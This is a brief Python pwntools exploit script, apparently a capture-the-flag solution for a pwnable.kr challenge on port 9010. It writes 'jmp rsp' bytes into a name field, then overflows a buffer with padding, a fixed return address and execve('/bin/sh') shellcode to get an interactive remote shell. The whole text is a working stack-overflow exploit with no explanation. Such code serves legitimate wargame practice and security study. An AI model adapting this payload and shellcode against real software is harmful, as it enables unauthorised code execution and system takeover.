from pwn import *
r = remote('pwnable.kr', 9010)

id_addr = 0x6020a0

print r.recvuntil(': ')
r.send('\xff\xe4\n') # jmp rsp

print r.recvuntil('> ')
r.send('1\n')

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = 'A' * 40 + p64(id_addr) + shellcode

print r.send(payload + '\n')
r.interactive()
